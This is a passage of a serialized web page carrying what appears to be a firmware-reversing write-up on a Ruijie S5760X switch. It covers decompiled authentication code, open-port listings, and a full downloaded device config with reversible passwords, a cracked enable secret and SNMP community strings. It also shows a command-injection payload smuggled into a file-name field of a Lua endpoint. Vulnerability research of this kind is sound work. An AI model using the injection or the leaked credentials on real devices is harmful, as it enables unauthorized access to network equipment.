\",\"$L64\",\" permission_user[permission_map[id]]) \",\"$L65\",\"\\n            \",\"$L66\",\" \",\"$L67\",\"\\n        \",\"$L68\",\" (\",\"$L69\",\"(permission_map[id])==\",\"$L6a\",\") \",\"$L6b\",\"\\n            \",\"$L6c\",\" k, v \",\"$L6d\",\" \",\"$L6e\",\"(permission_map[id]) \",\"$L6f\",\"\\n                \",\"$L70\",\" permission_user[v] \",\"$L71\",\"\\n                    \",\"$L72\",\" \",\"$L73\",\";\\n                \",\"$L74\",\"\\n            \",\"$L75\",\"\\n            \",\"$L76\",\" \",\"$L77\",\";\\n        \",\"$L78\",\"\\n            \",\"$L79\",\" \",\"$L7a\",\";\\n        \",\"$L7b\",\"\\n    \",\"$L7c\",\"\\n    \",\"$L7d\",\" \",\"$L7e\",\";\\n\",\"$L7f\",\"\\n\"]}]}]\n"])</script><script>self.__next_f.push([1,"3a:[\"$\",\"p\",\"p-18\",{\"children\":[\"Every handler except \",[\"$\",\"code\",\"code-0\",{\"children\":\"unauthenticate.unauthenticate\"}],\" requires login.\\nThe authentication implementation is in \",[\"$\",\"code\",\"code-1\",{\"children\":\"httpd.elf\"}],\".\"]}]\n"])</script><script>self.__next_f.push([1,"3b:[\"$\",\"$L12\",\"pre-14\",{\"children\":[\"$\",\"code\",\"code-0\",{\"className\":\"hljs language-c\",\"children\":[[\"$\",\"span\",\"span-0\",{\"className\":\"hljs-built_in\",\"children\":\"memset\"}],\"(decode_value, \",[\"$\",\"span\",\"span-1\",{\"className\":\"hljs-number\",\"children\":\"0\"}],\", \",[\"$\",\"span\",\"span-2\",{\"className\":\"hljs-keyword\",\"children\":\"sizeof\"}],\"(decode_value)); \",[\"$\",\"span\",\"span-3\",{\"className\":\"hljs-comment\",\"children\":\"// Clear the decoded-string buffer.\"}],\"\\n\\nv4 = \",[\"$\",\"span\",\"span-4\",{\"className\":\"hljs-built_in\",\"children\":\"strlen\"}],\"(auth_buf); \",[\"$\",\"span\",\"span-5\",{\"className\":\"hljs-comment\",\"children\":\"// Get the authentication-string length.\"}],\"\\n\",[\"$\",\"span\",\"span-6\",{\"className\":\"hljs-keyword\",\"children\":\"if\"}],\" ((\",[\"$\",\"span\",\"span-7\",{\"className\":\"hljs-type\",\"children\":\"int\"}],\")base64_decode(auth_buf, v4, decode_value, \",[\"$\",\"span\",\"span-8\",{\"className\":\"hljs-number\",\"children\":\"95LL\"}],\") \u003e= \",[\"$\",\"span\",\"span-9\",{\"className\":\"hljs-number\",\"children\":\"0\"}],\") \",[\"$\",\"span\",\"span-10\",{\"className\":\"hljs-comment\",\"children\":\"// Base64-decode the authentication data.\"}],\"\\n{\\n    password = \",[\"$\",\"span\",\"span-11\",{\"className\":\"hljs-built_in\",\"children\":\"strchr\"}],\"(decode_value, \",[\"$\",\"span\",\"span-12\",{\"className\":\"hljs-string\",\"children\":\"':'\"}],\"); \",[\"$\",\"span\",\"span-13\",{\"className\":\"hljs-comment\",\"children\":\"// Find the colon separator.\"}],\"\\n    \",[\"$\",\"span\",\"span-14\",{\"className\":\"hljs-keyword\",\"children\":\"if\"}],\" (password) \",[\"$\",\"span\",\"span-15\",{\"className\":\"hljs-comment\",\"children\":\"// Separator found.\"}],\"\\n    {\\n        *password = \",[\"$\",\"span\",\"span-16\",{\"className\":\"hljs-number\",\"children\":\"0\"}],\"; \",[\"$\",\"span\",\"span-17\",{\"className\":\"hljs-comment\",\"children\":\"// Replace the separator with a null terminator.\"}],\"\\n        \\n        \",[\"$\",\"span\",\"span-18\",{\"className\":\"hljs-comment\",\"children\":\"// Get the current encoding; use UTF-8 if that lookup fails.\"}],\"\\n        \",[\"$\",\"span\",\"span-19\",{\"className\":\"hljs-keyword\",\"children\":\"if\"}],\" ((\",[\"$\",\"span\",\"span-20\",{\"className\":\"hljs-type\",\"children\":\"unsigned\"}],\" \",[\"$\",\"span\",\"span-21\",{\"className\":\"hljs-type\",\"children\":\"int\"}],\")cli_get_lang_char_set())\\n            lang_char_set = cli_get_lang_char_set();\\n        \",[\"$\",\"span\",\"span-22\",{\"className\":\"hljs-keyword\",\"children\":\"else\"}],\"\\n            lang_char_set = \",[\"$\",\"span\",\"span-23\",{\"className\":\"hljs-number\",\"children\":\"3\"}],\";\\n            \\n        \",[\"$\",\"span\",\"span-24\",{\"className\":\"hljs-comment\",\"children\":\"// Convert the decoded username and store it in src.\"}],\"\\n        src = (\",[\"$\",\"span\",\"span-25\",{\"className\":\"hljs-type\",\"children\":\"char\"}],\" *)trancode_strdup(decode_value, \",[\"$\",\"span\",\"span-26\",{\"className\":\"hljs-number\",\"children\":\"1LL\"}],\", lang_char_set, \u0026v17);\\n        \",[\"$\",\"span\",\"span-27\",{\"className\":\"hljs-keyword\",\"children\":\"if\"}],\" (src)\\n        {\\n            \",[\"$\",\"span\",\"span-28\",{\"className\":\"hljs-built_in\",\"children\":\"memset\"}],\"(decode_value, \",[\"$\",\"span\",\"span-29\",{\"className\":\"hljs-number\",\"children\":\"0\"}],\", \",[\"$\",\"span\",\"span-30\",{\"className\":\"hljs-keyword\",\"children\":\"sizeof\"}],\"(decode_value)); \",[\"$\",\"span\",\"span-31\",{\"className\":\"hljs-comment\",\"children\":\"// Clear the decoded-string buffer.\"}],\"\\n            \",[\"$\",\"span\",\"span-32\",{\"className\":\"hljs-built_in\",\"children\":\"strncpy\"}],\"(decode_value, src, \",[\"$\",\"span\",\"span-33\",{\"className\":\"hljs-number\",\"children\":\"0x5Fu\"}],\"LL); \",[\"$\",\"span\",\"span-34\",{\"className\":\"hljs-comment\",\"children\":\"// Copy the converted username.\"}],\"\\n            \",[\"$\",\"span\",\"span-35\",{\"className\":\"hljs-built_in\",\"children\":\"free\"}],\"(src); \",[\"$\",\"span\",\"span-36\",{\"className\":\"hljs-comment\",\"children\":\"// Free the temporary allocation.\"}],\"\\n            \\n            \",[\"$\",\"span\",\"span-37\",{\"className\":\"hljs-keyword\",\"children\":\"if\"}],\" (\",[\"$\",\"span\",\"span-38\",{\"className\":\"hljs-built_in\",\"children\":\"strlen\"}],\"(decode_value) \u003c= \",[\"$\",\"span\",\"span-39\",{\"className\":\"hljs-number\",\"children\":\"0x1F\"}],\") \",[\"$\",\"span\",\"span-40\",{\"className\":\"hljs-comment\",\"children\":\"// Limit the username to 31 characters.\"}],\"\\n            {\\n                \",\"$L80\",\"(\u0026v18, \",\"$L81\",\", \",\"$L82\",\"(v18)); \",\"$L83\",\"\\n                clock_gettime(\",\"$L84\",\", \u0026v18); \",\"$L85\",\"\\n                \\n                \",\"$L86\",\" (!\",\"$L87\",\"(decode_value, \",\"$L88\",\")) \",\"$L89\",\"\\n                {\\n                    pthread_mutex_lock(\u0026stru_455430); \",\"$L8a\",\"\\n                    \\n                    v25 = \",\"$L8b\",\";\\n                    \",\"$L8c\",\" (v25 \u003c= \",\"$L8d\",\") \",\"$L8e\",\"\\n                    {\\n                        v21 = *(_QWORD *)\u0026dword_455460[\",\"$L8f\",\" * v25 + \",\"$L90\",\"];\\n                        \\n                        \",\"$L91\",\" (s1 = (\",\"$L92\",\" *)(v21 - \",\"$L93\",\");; s1 = (\",\"$L94\",\" *)(v20 - \",\"$L95\",\"))\\n                        {\\n                            _X0 = *((_QWORD *)s1 + \",\"$L96\",\");\\n                            __asm { PRFM            #\",\"$L97\",\", [X0] }\\n                            \\n                            \",\"$L98\",\" (s1 + \",\"$L99\",\" == (\",\"$L9a\",\" *)\u0026dword_455460[\",\"$L9b\",\" * v25 + \",\"$L9c\",\"])\\n                            {\\n                                ++v25;\\n                                \",\"$L9d\",\";\\n                            }\\n                            \\n                            \",\"$L9e\",\" (!\",\"$L9f\",\"(s1, decode_value)) \",\"$La0\",\"\\n                                \",\"$La1\",\";\\n                            \\n                            v20 = *((_QWORD *)s1 + \",\"$La2\",\");\\n                        }\\n                        \\n                        \",\"$La3\",\" (s1 + \",\"$La4\",\" == (\",\"$La5\",\" *)\u0026dword_455460[\",\"$La6\",\" * v25 + \",\"$La7\",\"])\\n                            \",\"$La8\",\";\\n                        \\n                        \",\"$La9\",\" (!byte_455464 \u0026\u0026 v18.tv_sec - *((_QWORD *)s1 + \",\"$Laa\",\") \u003e \",\"$Lab\",\")\\n                            *((_DWORD *)s1 + \",\"$Lac\",\") = \",\"$Lad\",\";\\n                            \\n                        \",\"$Lae\",\" (*((\",\"$Laf\",\" *)s1 + \",\"$Lb0\",\") \u003e \",\"$Lb1\",\") \",\"$Lb2\",\"\\n                        {\\n                            debug_log(\",\"$Lb3\",\", \",\"$Lb4\",\");\\n                            pthread_mutex_unlock(\u0026stru_455430);\\n                            \",\"$Lb5\",\" \",\"$Lb6\",\";\\n                        }\\n                        \",\"$Lb7\",\"\\n                        {\\n                            \",\"$Lb8\",\" (!\",\"$Lb9\",\"(s1 + \",\"$Lba\",\", auth_buf)) \",\"$Lbb\",\"\\n                            {\\n                                *((_DWORD *)s1 + \",\"$Lbc\",\") = \",\"$Lbd\",\"; \",\"$Lbe\",\"\\n                                clock_gettime(\",\"$Lbf\",\", (\",\"$Lc0\",\" timespec *)s1 + \",\"$Lc1\",\"); \",\"$Lc2\",\"\\n                                pthread_mutex_unlock(\u0026stru_455430); \",\"$Lc3\",\"\\n                                \\n                                \",\"$Lc4\",\" (\",\"$Lc5\",\"((\",\"$Lc6\",\" \",\"$Lc7\",\" *)(a3 + \",\"$Lc8\",\"), s1))\\n                                    printk_syslog_ext(\",\"$Lc9\",\", \",\"$Lca\",\", \",\"$Lcb\",\", \",\"$Lcc\",\", \",\"$Lcd\",\", s1, (\",\"$Lce\",\" \",\"$Lcf\",\" *)(a3 + \",\"$Ld0\",\"));\\n                                    \\n                                \",\"$Ld1\",\"(a2, s1, \",\"$Ld2\",\"LL); \",\"$Ld3\",\"\\n                                \",\"$Ld4\",\" \",\"$Ld5\",\"; \",\"$Ld6\",\"\\n                            }\\n\"]}]}]\n"])</script><script>self.__next_f.push([1,"3c:[\"$\",\"p\",\"p-19\",{\"children\":\"The authentication boundary appeared strong, so I paused that route and considered other ports. Port 80 exposed Lua and httpd without another supporting service that offered an obvious entry point.\"}]\n3d:[\"$\",\"h3\",\"h3-2\",{\"children\":\"DEBUG\"}]\n3e:[\"$\",\"p\",\"p-20\",{\"children\":\"A convenient injection point for debugging:\"}]\n3f:[\"$\",\"$L12\",\"pre-15\",{\"children\":[\"$\",\"code\",\"code-0\",{\"children\":\"http://192.168.48.73/web/init.lua/ac.system.feature/moveFile\\nmethod: POST\\ndata: name=';ps aux \u003e views/2;\\nRetrieving the return value:\\nhttp://192.168.48.73/2\\n\"}]}]\n40:[\"$\",\"h2\",\"h2-2\",{\"id\":\"section-3\",\"children\":\"Service reconnaissance\"}]\n41:[\"$\",\"p\",\"p-21\",{\"children\":\"Open ports:\"}]\nd7:Tcac,"])</script><script>self.__next_f.push([1,"Active Internet connections (servers and established)\nProto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    \ntcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      5557/httpd.elf\ntcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      4577/rg-sshd\ntcp        0      0 0.0.0.0:23              0.0.0.0:*               LISTEN      4588/rg-telnetd\ntcp        0      0 0.0.0.0:7547            0.0.0.0:*               LISTEN      5525/cwmp_gsoap.elf\ntcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN      5557/httpd.elf\ntcp        0      0 0.0.0.0:830             0.0.0.0:*               LISTEN      4577/rg-sshd\ntcp        0      0 192.168.48.73:80        192.168.51.22:50589     ESTABLISHED 5557/httpd.elf\ntcp        0      0 192.168.48.73:80        192.168.51.22:53193     SYN_RECV    -\ntcp        0      0 192.168.48.73:80        192.168.51.22:52547     TIME_WAIT   -\ntcp        0      0 :::80                   :::*                    LISTEN      5557/httpd.elf\ntcp        0      0 :::22                   :::*                    LISTEN      4577/rg-sshd\ntcp        0      0 :::23                   :::*                    LISTEN      4588/rg-telnetd\ntcp        0      0 :::443                  :::*                    LISTEN      5557/httpd.elf\ntcp        0      0 :::830                  :::*                    LISTEN      4577/rg-sshd\nudp        0      0 0.0.0.0:67              0.0.0.0:*                           6009/dhcp.elf\nudp        0      0 0.0.0.0:68              0.0.0.0:*                           6123/dhcpc.elf\nudp        0      0 0.0.0.0:123             0.0.0.0:*                           6197/ntp.elf\nudp        0      0 0.0.0.0:41613           0.0.0.0:*                           5694/rg-snmpd\nudp        0      0 0.0.0.0:41106           0.0.0.0:*                           5379/rg_syslogd\nudp        0      0 0.0.0.0:161             0.0.0.0:*                           5694/rg-snmpd\nudp        0      0 0.0.0.0:7547            0.0.0.0:*                           5514/cwmp.elf\nudp        0      0 :::47731                :::*                                5694/rg-snmpd\nudp        0      0 :::123                  :::*                                6197/ntp.elf\nudp        0      0 :::161                  :::*                                5694/rg-snmpd\nraw        0      0 0.0.0.0:1               0.0.0.0:*               1           6009/dhcp.elf\nraw        0      0 0.0.0.0:1               0.0.0.0:*               1           6024/vrrp.elf\nraw        0      0 0.0.0.0:1               0.0.0.0:*               1           5952/webauth\nraw        0      0 0.0.0.0:2               0.0.0.0:*               2           5729/igmp.elf\nraw        0      0 0.0.0.0:112             0.0.0.0:*               112         6024/vrrp.elf\nraw        0      0 ::%4307600:58           :::*                    58          6024/vrrp.elf\nraw        0      0 ::%4307600:58           :::*                    58          5751/mld.elf\nraw        0      0 ::%4307600:58           :::*                    58          4487/tcpip.elf\nraw        0      0 ::%4307600:112          :::*                    112         6024/vrrp.elf\n"])</script><script>self.__next_f.push([1,"42:[\"$\",\"$L12\",\"pre-16\",{\"children\":[\"$\",\"code\",\"code-0\",{\"children\":\"$d7\"}]}]\n43:[\"$\",\"p\",\"p-22\",{\"children\":\"Service analysis:\\nTCP services:\"}]\n44:[\"$\",\"ul\",\"ul-0\",{\"children\":[\"\\n\",[\"$\",\"li\",\"li-0\",{\"children\":[\"80: \",[\"$\",\"code\",\"code-0\",{\"children\":\"httpd\"}],\".\"]}],\"\\n\",[\"$\",\"li\",\"li-1\",{\"children\":[\"22, 830: \",[\"$\",\"code\",\"code-0\",{\"children\":\"sshd\"}],\".\"]}],\"\\n\",[\"$\",\"li\",\"li-2\",{\"children\":[\"23: \",[\"$\",\"code\",\"code-0\",{\"children\":\"telnetd\"}],\".\"]}],\"\\n\",[\"$\",\"li\",\"li-3\",{\"children\":[\"7547: \",[\"$\",\"code\",\"code-0\",{\"children\":\"cwmp_gsoap.elf\"}],\".\\nUDP services:\"]}],\"\\n\",[\"$\",\"li\",\"li-4\",{\"children\":[\"67, 68: \",[\"$\",\"code\",\"code-0\",{\"children\":\"dhcp\"}],\" / \",[\"$\",\"code\",\"code-1\",{\"children\":\"dhcpd\"}],\"; deferred until other candidates had been investigated.\"]}],\"\\n\",[\"$\",\"li\",\"li-5\",{\"children\":[\"123: \",[\"$\",\"code\",\"code-0\",{\"children\":\"ntp\"}],\".\"]}],\"\\n\",[\"$\",\"li\",\"li-6\",{\"children\":[\"161, 41613: \",[\"$\",\"code\",\"code-0\",{\"children\":\"rg-snmpd\"}],\".\"]}],\"\\n\",[\"$\",\"li\",\"li-7\",{\"children\":[\"41106: \",[\"$\",\"code\",\"code-0\",{\"children\":\"syslogd\"}],\".\\n7547:cwmp.elf\\nNo controllable process arguments were identified.\"]}],\"\\n\"]}]\n45:[\"$\",\"h2\",\"h2-3\",{\"id\":\"section-4\",\"children\":\"Investigating the HTTP service\"}]\n46:[\"$\",\"p\",\"p-23\",{\"children\":[\"download.do:\\n\",[\"$\",\"code\",\"code-0\",{\"children\":\"http://192.168.48.73/download.do?file=config.text\u0026random=ZC77\"}],\"\\nThe file-download handler belongs to \",[\"$\",\"code\",\"code-1\",{\"children\":\"httpd.elf\"}],\".\\nThe files downloadable at this stage were \",[\"$\",\"code\",\"code-2\",{\"children\":\"config.text\"}],\" and \",[\"$\",\"code\",\"code-3\",{\"children\":\"/web/websys-info.xml\"}],\".\\nContents of \",[\"$\",\"code\",\"code-4\",{\"children\":\"config.text\"}],\":\"]}]\nd8:T1596,"])</script><script>self.__next_f.push([1,"version S5760X_RGOS 12.3(1)B0701\nhostname HTJ_ZJ_NB_GXQGJHZZX_3F_S5760\n!\nspanning-tree mst configuration\n name hanting\n!\nspanning-tree mst 0 priority 4096\nspanning-tree\n!\nip access-list standard 1\n 10 deny 192.168.0.0 0.0.255.255 \n 20 deny 172.30.0.0 0.0.255.255 \n 30 permit any \n!\nno ip dhcp snooping vlan 9-10\nip dhcp snooping\n!\nusername admin privilege 15 password 7 0372003d576c507b4044705d4b\n!\naaa new-model\n!\naaa authorization exec ACS group tacacs+ local\naaa authorization exec default local\naaa authentication login ACS group tacacs+ local\naaa authentication login default local\n!\ncwmp\n acs url http://cloud.ruijie.com.cn/service/tr069servlet\n cpe inform interval 180\n timer cpe-timeout 90\n!\nservice dhcp\nip dhcp excluded-address 172.30.0.1 172.30.0.100\n!\nip dhcp pool WiFi-RG_AP\n option 138 ip 10.76.3.14 \n network 172.30.0.0 255.255.252.0\n default-router 172.30.0.1 \n!\ninstall 0 S5760C-24GT8XS-X\n!\nsysmac c0b8.e653.b8b3\nip name-server 114.114.114.114\n!\nenable service web-server http\nenable service web-server https\nwebmaster level 0 username admin password 7 127657411e5877\n!\nnfpp\n no arp-guard enable\n no ip-guard enable\n!\nservice password-encryption\n!\nredundancy\n!\nlogging buffered 50000\nlogging trap warnings\nlogging server 10.1.21.21\nclock timezone beijing +8 0\n!\ntacacs-server host 10.1.240.20 key 7 034b22191c3616\n!\naaa authorization console\nbanner login \u0003C Please Use ACS Account Login this Device!  \n\u0003\nenable secret 5 $1$324j$5pz370x092w32qt1 \nenable service ssh-server\n!\nvlan 2\n name Wifi-User\n!\nvlan 9\n name AP_GW-Manage\n!\nvlan 10\n name Manage\n!\nvlan 20\n name IPPABX-Robot\n!\nvlan 96\n name Smart_Speaker\n!\nvlan 100\n name Internet-Business_qiantai\n!\nvlan 120\n name Smart_TV\n!\nvlan 200\n name Smart_RCU\n!\nvlan range 1,800\n!\ninterface GigabitEthernet 0/1\n description To_Gateway\n switchport mode trunk\n ip dhcp snooping trust\n!\ninterface GigabitEthernet 0/2\n description To_GA_JK\n!\ninterface GigabitEthernet 0/3\n switchport protected\n switchport mode trunk\n!\ninterface GigabitEthernet 0/4\n description To_GA_JK_upload\n switchport access vlan 2\n!\ninterface GigabitEthernet 0/5\n description To_Smart_TV_Server\n switchport access vlan 120\n!\ninterface GigabitEthernet 0/6\n description To_Smart_TV_Server\n switchport access vlan 120\n!\ninterface GigabitEthernet 0/7\n description To_Smart_TV_Server\n switchport access vlan 120\n!\ninterface GigabitEthernet 0/8\n description To_Smart_RCU_Server\n switchport access vlan 200\n!\ninterface GigabitEthernet 0/9\n description To_Delivery_Robot\n switchport access vlan 20\n!\ninterface GigabitEthernet 0/10\n description To_IPPABX-HuaxiaoAI_Robot\n switchport access vlan 20\n!\ninterface GigabitEthernet 0/11\n switchport protected\n description To_POE_Switch\n switchport mode trunk\n ip dhcp snooping trust\n!\ninterface GigabitEthernet 0/12\n switchport protected\n description To_POE_Switch\n switchport mode trunk\n ip dhcp snooping trust\n!\ninterface GigabitEthernet 0/13\n switchport protected\n description To_POE_Switch\n switchport mode trunk\n ip dhcp snooping trust\n!\ninterface GigabitEthernet 0/14\n switchport protected\n description To_POE_Switch\n switchport mode trunk\n ip dhcp snooping trust\n!\ninterface GigabitEthernet 0/15\n switchport protected\n description To_POE_Switch\n switchport mode trunk\n ip dhcp snooping trust\n!\ninterface GigabitEthernet 0/16\n switchport protected\n description To_POE_Switch\n switchport mode trunk\n ip dhcp snooping trust\n!\ninterface GigabitEthernet 0/17\n switchport protected\n description To_POE_Switch\n switchport mode trunk\n ip dhcp snooping trust\n!\ninterface GigabitEthernet 0/18\n switchport protected\n description To_POE_Switch\n switchport mode trunk\n ip dhcp snooping trust\n!\ninterface GigabitEthernet 0/19\n switchport protected\n description To_POE_Switch\n switchport mode trunk\n ip dhcp snooping trust\n!\ninterface GigabitEthernet 0/20\n switchport protected\n description To_POE_Switch\n switchport mode trunk\n ip dhcp snooping trust\n!\ninterface GigabitEthernet 0/21\n description To_VPN\n switchport mode trunk\n!\ninterface GigabitEthernet 0/22\n description To_VPN\n switchport mode trunk\n!\ninterface GigabitEthernet 0/23\n description To_AC\n switchport mode trunk\n ip dhcp snooping trust\n!\ninterface GigabitEthernet 0/24\n description To_PMS_Switch\n switchport mode trunk\n!\ninterface TenGigabitEthernet 0/25\n!\ninterface TenGigabitEthernet 0/26\n!\ninterface TenGigabitEthernet 0/27\n!\ninterface TenGigabitEthernet 0/28\n!\ninterface TenGigabitEthernet 0/29\n!\ninterface TenGigabitEthernet 0/30\n!\ninterface TenGigabitEthernet 0/31\n!\ninterface TenGigabitEthernet 0/32\n!\ninterface VLAN 1\n ip address mix dhcp\n ip address mix 192.168.1.200 255.255.255.0\n!\ninterface VLAN 9\n description AP-GW-Manage\n ip address 172.30.0.1 255.255.252.0\n!\ninterface VLAN 10\n ip address 10.76.3.125 255.255.255.128\n!\ninterface VLAN 800\n description IPPBX-Gateway\n ip address 10.76.3.250 255.255.255.128\n!\ninterface Mgmt 0\n ip address mix dhcp\n ip address mix 192.168.1.200 255.255.255.0\n!\nntp server 10.76.3.126\nntp server 10.1.240.10\n!\nmonitor session 1 destination interface GigabitEthernet 0/2 switch\nmonitor session 1 source interface GigabitEthernet 0/1 both\n!\nip route 0.0.0.0 0.0.0.0 10.76.3.126\nip route 10.0.0.0 255.0.0.0 10.76.3.1\n!\nsnmp-server host 10.1.21.21 traps HuAzHu@SnMpRw\nsnmp-server community 7 120f10335025343218222855333e rw \nsnmp-server community 7 0062216d571e16211e0b1a14282f300065 ro \n!\nline console 0\n authorization exec ACS\n login authentication ACS\nline vty 0 4\n access-class 1 in\n exec-timeout 15 0\n authorization exec ACS\n login authentication ACS\n!\nend\n"])</script><script>self.__next_f.push([1,"47:[\"$\",\"$L12\",\"pre-17\",{\"children\":[\"$\",\"code\",\"code-0\",{\"className\":\"hljs language-text\",\"children\":\"$d8\"}]}]\n48:[\"$\",\"p\",\"p-24\",{\"children\":\"Relevant information:\"}]\n49:[\"$\",\"$L12\",\"pre-18\",{\"children\":[\"$\",\"code\",\"code-0\",{\"children\":\"Front-desk VLAN: 100.\\nvlan 100\\n name Internet-Business_qiantai\\nenable secret 5 $1$324j$5pz370x092w32qt1  // Researcher-configured value: QWE12345678.\\nenable service ssh-server\\n\"}]}]\n4a:[\"$\",\"div\",null,{\"className\":\"article-tags\",\"children\":[[\"$\",\"$L5\",\"Ruijie\",{\"className\":\"tag\",\"href\":\"/search?q=Ruijie\",\"children\":[\"#\",\"Ruijie\"]}],[\"$\",\"$L5\",\"S5760X\",{\"className\":\"tag\",\"href\":\"/search?q=S5760X\",\"children\":[\"#\",\"S5760X\"]}],[\"$\",\"$L5\",\"RGOS\",{\"className\":\"tag\",\"href\":\"/search?q=RGOS\",\"children\":[\"#\",\"RGOS\"]}],[\"$\",\"$L5\",\"firmware\",{\"className\":\"tag\",\"href\":\"/search?q=firmware\",\"children\":[\"#\",\"firmware\"]}],[\"$\",\"$L5\",\"Lua\",{\"className\":\"tag\",\"href\":\"/search?q=Lua\",\"children\":[\"#\",\"Lua\"]}],[\"$\",\"$L5\",\"authentication\",{\"className\":\"tag\",\"href\":\"/search?q=authentication\",\"children\":[\"#\",\"authentication\"]}]]}]\n4b:[\"$\",\"nav\",null,{\"className\":\"reading-nav\",\"aria-label\":\"Article navigation\",\"children\":[[\"$\",\"$L5\",null,{\"href\":\"/articles\",\"children\":[\"← \",\"Back to archive\"]}],[\"$\",\"$L5\",null,{\"href\":\"/notes\",\"children\":\"Continue with Notes ↗\"}]]}]\n4c:[\"$\",\"aside\",null,{\"className\":\"toc-wrap\",\"children\":[[\"$\",\"$L11\",null,{\"items\":\"$6:1:props:children:0:props:children:0:props:items\",\"label\":\"On this page\"}],[\"$\",\"div\",null,{\"className\":\"toc-meta\",\"children\":[\"Firmware Reversing\",[\"$\",\"br\",null,{}],\"12 min read\",[\"$\",\"br\",null,{}],[\"$\",\"$L5\",null,{\"href\":\"/articles\",\"children\":\"All articles ↗\"}]]}]]}]\n4d:[\"$\",\"section\",null,{\"className\":\"related-reading\",\"children\":[[\"$\",\"div\",null,{\"className\":\"section-heading\",\"children\":[\"$\",\"h2\",null,{\"children\":\"Continue reading\"}]}],[\"$\",\"div\",null,{\"className\":\"related-grid\",\"children\":[[\"$\",\"$L5\",\"centurylink-openwrt-research\",{\"href\":\"/articles/centurylink-openwrt-research\",\"children\":[[\"$\",\"span\",null,{\"className\":\"meta\",\"children\":\"Firmware Reversing\"}],[\"$\",\"h3\",null,{\"children\":\"Inside the CenturyLink firmware.\"}],[\"$\",\"span\",null,{\"className\":\"meta\",\"children\":[\"12 min read\",\" ↗\"]}]]}],[\"$\",\"$L5\",\"dlink-dsr-250n-research\",{\"href\":\"/articles/dlink-dsr-250n-research\",\"children\":[[\"$\",\"span\",null,{\"className\":\"meta\",\"children\":\"Vulnerability Research\"}],[\"$\",\"h3\",null,{\"children\":\"Following the DSR-250N request path.\"}],[\"$\",\"span\",null,{\"className\":\"meta\",\"children\":[\"8 min read\",\" ↗\"]}]]}]]}]]}]\n"])</script><script>self.__next_f.push([1,"4e:[\"$\",\"span\",\"span-46\",{\"className\":\"hljs-keyword\",\"children\":\"end\"}]\n4f:[\"$\",\"span\",\"span-47\",{\"className\":\"hljs-keyword\",\"children\":\"return\"}]\n50:[\"$\",\"span\",\"span-48\",{\"className\":\"hljs-keyword\",\"children\":\"return\"}]\n51:[\"$\",\"span\",\"span-45\",{\"className\":\"hljs-keyword\",\"children\":\"do\"}]\n52:[\"$\",\"span\",\"span-46\",{\"className\":\"hljs-number\",\"children\":\"1\"}]\n53:[\"$\",\"span\",\"span-47\",{\"className\":\"hljs-keyword\",\"children\":\"end\"}]\n54:[\"$\",\"span\",\"span-48\",{\"className\":\"hljs-built_in\",\"children\":\"self\"}]\n55:[\"$\",\"span\",\"span-49\",{\"className\":\"hljs-keyword\",\"children\":\"end\"}]\n56:[\"$\",\"span\",\"span-50\",{\"className\":\"hljs-function\",\"children\":[[\"$\",\"span\",\"span-0\",{\"className\":\"hljs-keyword\",\"children\":\"function\"}],\" \",[\"$\",\"span\",\"span-1\",{\"className\":\"hljs-title\",\"children\":\"M.reload\"}],[\"$\",\"span\",\"span-2\",{\"className\":\"hljs-params\",\"children\":\"(self)\"}]]}]\n57:[\"$\",\"span\",\"span-51\",{\"className\":\"hljs-literal\",\"children\":\"false\"}]\n58:[\"$\",\"span\",\"span-52\",{\"className\":\"hljs-keyword\",\"children\":\"end\"}]\n59:[\"$\",\"span\",\"span-53\",{\"className\":\"hljs-keyword\",\"children\":\"return\"}]\n5a:[\"$\",\"span\",\"span-41\",{\"className\":\"hljs-string\",\"children\":\"\\\"all\\\"\"}]\n5b:[\"$\",\"span\",\"span-42\",{\"className\":\"hljs-keyword\",\"children\":\"or\"}]\n5c:[\"$\",\"span\",\"span-43\",{\"className\":\"hljs-string\",\"children\":\"\\\"admin\\\"\"}]\n5d:[\"$\",\"span\",\"span-44\",{\"className\":\"hljs-keyword\",\"children\":\"then\"}]\n5e:[\"$\",\"span\",\"span-45\",{\"className\":\"hljs-keyword\",\"children\":\"return\"}]\n5f:[\"$\",\"span\",\"span-46\",{\"className\":\"hljs-literal\",\"children\":\"true\"}]\n60:[\"$\",\"span\",\"span-47\",{\"className\":\"hljs-keyword\",\"children\":\"end\"}]\n61:[\"$\",\"span\",\"span-48\",{\"className\":\"hljs-keyword\",\"children\":\"if\"}]\n62:[\"$\",\"span\",\"span-49\",{\"className\":\"hljs-built_in\",\"children\":\"type\"}]\n63:[\"$\",\"span\",\"span-50\",{\"className\":\"hljs-string\",\"children\":\"\\\"string\\\"\"}]\n64:[\"$\",\"span\",\"span-51\",{\"className\":\"hljs-keyword\",\"children\":\"and\"}]\n65:[\"$\",\"span\",\"span-52\",{\"className\":\"hljs-keyword\",\"children\":\"then\"}]\n66:[\"$\",\"span\",\"span-53\",{\"className\":\"hljs-keyword\",\"children\":\"return\"}]\n67:[\"$\",\"span\",\"span-54\",{\"className\":\"hljs-literal\",\"children\":\"true\"}]\n68:[\"$\",\"span\",\"span-55\",{\"className\":\"hljs-keyword\",\"children\":\"elseif\"}]\n69:[\"$\",\"span\",\"span-56\",{\"className\":\"hljs-built_in\",\"children\":\"type\"}]\n6a:[\"$\",\"span\",\"span-57\",{\"className\":\"hljs-string\",\"children\":\"\\\"table\\\"\"}]\n6b:[\"$\",\"span\",\"span-58\",{\"className\":\"hljs-keyword\",\"children\":\"then\"}]\n6c:[\"$\",\"span\",\"span-59\",{\"className\":\"hljs-keyword\",\"children\":\"for\"}]\n6d:[\"$\",\"span\",\"span-60\",{\"className\":\"hljs-keyword\",\"children\":\"in\"}]\n6e:[\"$\",\"span\",\"span-61\",{\"className\":\"hljs-built_in\",\"children\":\"pairs\"}]\n6f:[\"$\",\"span\",\"span-62\",{\"className\":\"hljs-keyword\",\"children\":\"do\"}]\n70:[\"$\",\"span\",\"span-63\",{\"className\":\"hljs-keyword\",\"children\":\"if\"}]\n71:[\"$\",\"span\",\"span-64\",{\"className\":\"hljs-keyword\",\"children\":\"then\"}]\n72:[\"$\",\"span\",\"span-65\",{\"className\":\"hljs-keyword\",\"children\":\"return\"}]\n73:[\"$\",\"span\",\"span-66\",{\"className\":\"hljs-literal\",\"children\":\"true\"}]\n74:[\"$\",\"span\",\"span-67\",{\"className\":\"hljs-keyword\",\"children\":\"end\"}]\n75:[\"$\",\"span\",\"span-68\",{\"className\":\"hljs-keyword\",\"children\":\"end\"}]\n76:[\"$\",\"span\",\"span-69\",{\"